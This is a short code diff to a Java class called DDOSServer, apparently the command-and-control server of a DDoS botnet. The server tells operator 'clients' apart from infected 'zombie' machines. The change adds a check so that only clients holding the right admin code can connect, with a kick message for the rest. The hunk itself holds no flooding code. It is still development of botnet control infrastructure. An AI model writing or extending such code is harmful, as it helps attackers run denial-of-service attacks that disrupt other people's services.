@@ -71,6 +71,14 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 
 			boolean isClient = !(boolean) initialPackage.getObjects()[0];
 			println(event.getConnection().getRemoteSocketAddress() + " connected: " + (isClient ? "client" : "zombie"));
+			if (isClient) {
+				boolean success;
+				if (!(success = CLIENT_JAR_CODE.equals(initialPackage.getObjects()[1]))) {
+					System.out.println(event.getConnection().getRemoteSocketAddress()
+							+ " Kicked for having an invalid admin password.");
+				}
+				event.getConnection().getOutputStream().writeObject(new Boolean(success));
+			}
 
 			server.setConnectionData(event, !isClient, null);
 
